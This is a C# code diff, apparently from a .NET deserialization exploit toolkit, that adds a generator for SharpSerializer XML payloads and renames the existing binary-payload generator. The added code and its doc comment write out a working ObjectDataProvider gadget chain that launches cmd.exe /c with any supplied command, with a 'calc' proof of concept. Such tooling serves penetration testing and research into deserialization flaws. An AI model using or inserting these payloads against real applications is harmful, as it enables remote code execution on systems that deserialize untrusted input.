@@ -10,7 +10,47 @@
     internal static class SharpSerializerHelperMethods
     {
         /// <summary>
-        /// Generates the sharp serializer payload with a supplied command.
+        /// Generates the SharpSerializer XML payload with a supplied command.
+        /// </summary>
+        /// <param name="command">The command</param>
+        /// <returns>The payload byte array.</returns>
+        /// <remarks>
+        /// 
+        /// Standard SharpSerializer XML version of ObjectDataProvider "calc" serialized object:
+        /// 
+        /// <Complex name="Root" type="System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+        ///   <Properties>
+        ///     <Complex name="ObjectInstance" type="System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+        ///       <Properties>
+        ///         <Complex name="StartInfo">
+        ///           <Properties>
+        ///             <Simple name="FileName" value="cmd.exe" />
+        ///             <Simple name="Arguments" value="/c calc" />
+        ///           </Properties>
+        ///         </Complex>
+        ///       </Properties>
+        ///     </Complex>
+        ///     <Simple name="MethodName" value="Start" />
+        ///   </Properties>
+        /// </Complex>
+        /// 
+        /// </remarks>
+        internal static string GenerateSharpSerializerXmlPayload(string command)
+        {
+            return
+                $"<Complex name=\"Root\" type=\"System.Windows.Data.ObjectDataProvider, " +
+                $"PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToke" +
+                $"n=31bf3856ad364e35\"><Properties><Complex name=\"ObjectInstance\" type" +
+                $"=\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutra" +
+                $"l, PublicKeyToken=b77a5c561934e089\"><Properties><Complex name=\"Start" +
+                $"Info\"><Properties><Simple name=\"FileName\" value=\"cmd.exe\" /><Simp" +
+                $"le name=\"Arguments\" value=\"/c {command}\" /></Properties></Complex>" +
+                $"</Properties></Complex><Simple name=\"MethodName\" value=\"Start\" /><" +
+                $"/Properties></Complex>";
+        }
+
+        /// <summary>
+        /// Generates the SharpSerializer binary payload with a supplied command.
         /// </summary>
         /// <param name="command">The command</param>
         /// <returns>The payload byte array.</returns>
@@ -43,7 +83,7 @@
         /// 00000160  06 01 05 01 02 01 05 53 74 61 72 74              .......Start
         /// 
         /// </remarks>
-        internal static byte[] GenerateSharpSerializerPayload(string command)
+        internal static byte[] GenerateSharpSerializerBinaryPayload(string command)
         {
             // First chunk of binary-serialized ObjectDataProvider bytes.
             IEnumerable<byte> firstPayloadPart =
